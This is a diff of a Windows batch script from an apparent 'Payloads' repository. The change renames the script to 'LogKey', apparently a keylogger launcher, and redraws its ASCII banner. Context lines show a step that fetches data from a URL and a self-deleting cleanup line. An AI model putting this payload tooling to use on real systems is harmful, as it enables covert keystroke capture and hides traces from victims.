@@ -1,5 +1,5 @@
 @echo off
-title Payloads: Logger
+title PLs: LogKey
 
 :: Config variables
 set "debug=0"
@@ -15,13 +15,13 @@ if "%1"=="1" (
 :: Art
 cls
 echo.
-echo. [33m"|     [1;36m /#######  /##      [0m                                                  [33m|"[0m
-echo. [33m"|     [1;36m| ##__  ##| ##      [0m                                                  [33m|"[0m
-echo. [33m"|     [1;36m| ##  \ ##| ##      [0m           [1;37mPayloads[0m by Jed556[0m                     [33m|"[0m
-echo. [33m"|     [1;36m| #######/| ##      [0m           [4mGitHub.com/Jed556/Payloads[0m             [33m|"[0m
-echo. [33m"|     [1;36m| ##____/ | ##      [0m                                                  [33m|"[0m
-echo. [33m"|     [1;36m| ##      | ########[0m                                                  [33m|"[0m
-echo. [33m"|     [1;36m|__/      |________/[0m                                                  [33m|"[0m
+echo. [0;34m"|     [1;36m /#######  /##                     [0m                                          [0;34m|"[0m
+echo. [0;34m"|     [1;36m| ##__  ##| ## [0;36m  /#######  [0m                                                  [0;34m|"[0m
+echo. [0;34m"|     [1;36m| ##  \ ##| ## [0;36m /##_____/  [0m        [1;37mPayloads[0m by Jed556[0m                        [0;34m|"[0m
+echo. [0;34m"|     [1;36m| #######/| ## [0;36m |  ######  [0m        [4mGitHub.com/Jed556/Payloads[0m                [0;34m|"[0m
+echo. [0;34m"|     [1;36m| ##____/ | ## [0;36m  \____  ## [0m        [1;32mActive[0m : LogKey[0m                           [0;34m|"[0m
+echo. [0;34m"|     [1;36m| ## [0;36m /#################/  [0m                                                  [0;34m|"[0m
+echo. [0;34m"|     [1;36m|__/ [0;36m/_________________/   [0m                                                  [0;34m|"[0m
 
 
 :: Get data from url
@@ -78,4 +78,5 @@ del /Q /F %fileName%
 
 echo Exiting...
 timeout /t 2 /nobreak > nul
+exit
 del /Q /F "%~f0" & exit
